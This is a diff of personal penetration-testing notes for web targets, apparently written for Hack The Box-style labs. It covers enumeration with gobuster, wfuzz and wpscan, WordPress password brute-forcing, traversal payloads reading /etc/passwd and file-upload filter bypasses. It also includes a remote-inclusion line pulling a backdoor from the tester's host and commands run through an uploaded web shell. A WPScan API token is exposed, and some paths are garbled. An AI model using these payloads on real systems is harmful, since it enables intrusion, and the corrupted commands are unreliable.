@@ -2,7 +2,7 @@
 
 1. Fingerprint with Nmap, then run script to enumerate further
 ```bash
-sudo nmap -p80 --script=http-enum $IP
+sudo nmap -p80 --script=http-enum $ip
 ```
 2. Analyze tech stack with Wappalyzer
 
@@ -13,11 +13,11 @@ gobuster dir -u http://loopback:9000 -w /opt/SecLists/Discovery/Web-Content/comb
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt --hc 404 "http://jeeves.htb:50000/FUZZ/"
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://editorial.htb/FUZZ"
 gobuster dns -d soccer.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
-gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x php,txt,html,whatever
+gobuster dir -u http://$ip -w /opt/SecLismember_home.jspts/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x php,txt,html,whatever
 # for api busting
 cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
 sed -i 's/^/{GOBUSTER}\//' apis
-gobuster dir -u http://$IP:5002 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -p apis
+gobuster dir -u http://$ip:5002 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -p apis
 # If you get hits, try to discover more directories using a smaller wordlist
 
 # Once you have the hostname, search for vhost
@@ -33,16 +33,26 @@ nikto --host $ip -ssl -evasion 1
 - Look for emails, names, user info, versioning (chhttp://editorial.htb/upload?ecking with searchsploit), examine input box code (checking for hidden form fields), anything interesting, check out robots.txt & sitemap.xml
 - Inspect every fkn inch of the website
 
-99. LFI
+5. LFI
 
 https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
 
-6. WPscan if it's wordpress
+6. WordPress
+
+WPscan if it's wordpress
+
 ```bash
 wpscan --url $url --enumerate p --plugins-detection aggressive # aggressive plugin detection
-wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u
-wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt # use the usernames that you have from above
+wpscan --url $url --disable-tls-checks --enumerate vp,vt,u,dbe --plugins-detection aggressive --plugins-version-detection aggressive --api-token KvAyO8bM4TYYDwJJMNhoU95g591rdNvk3jiKpQHG5uY
+wpscan --url $url --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt # use the usernames that you have from above
 ```
+
+```bash
+gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -k -t 10 --exclude-length 6
+gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt -k -t 10 --exclude-length 6
+```
+
+Look at the cookies.. if there's a cookie name that you don't know, it could be coming from a plugin that has a vulnerability, such as pmpro_visit=1.
 
 7. Potentially brute forcing admin/login panel with Burp Intruder
 
@@ -95,6 +105,8 @@ echo BASE64_ENCODED_STRING | base64 -d
 ```
 
 13. Directory Traversal
+
+- For directory traversals, try to start with a '/', so "http://192.168.165.43/index.php?p=backup/../../../../../../../../"
 
 - If there's something like "https://example.com/cms/login.php?language=en.html", then try to navigate to the file directly with "https://example.com/cms/en.html". If you can, this confirms that en.html is a file on the server and it may be vulnerable to something like "http://example.com/subdir/index.php?page=../../../../../../../../../etc/passwd"
 
@@ -180,7 +192,7 @@ curl "http://example.com/subdir/index.php?page=http://$YOUR_IP/simple-backdoor.p
 
 - Wherever you can upload files, see what files you are allowed to upload. If .php files are blacklisted, then you can try to use .pHP, .phps, .php7, pht, phpt, phtml, php3, php4, php5, php6 instead. If .sh files are blacklisted, then you can try to use .zsh instead.
 
-- Whitelisting may be able to be bypassed through methods such as adding a null byte injection, "shell.php%00.txt", or by using double extensions for the file, "shell.txt.php"
+- Whitelisting may be able to be bypassed through methods such as adding a null byte injection, "payload.php\x00.png", "shell.php%00.txt", "echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png", or by using double extensions for the file, "shell.txt.php"
 
 - Try changing the Content-Type header in Burp to something that you know it accepts, such as s image/jpeg, image/gif, image/png.
 
@@ -193,6 +205,7 @@ curl "http://example.com/subdir/index.php?page=http://$YOUR_IP/simple-backdoor.p
 ```bash
 curl http://example.com/meteor/subdir/simple-backdoor.pHP?cmd=dir
 ```
+Here's a crazy good resource for a high level gauntlet of what you can do, "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload".
 
 If you can, then get a reverse shell with powershell (>-<):
 
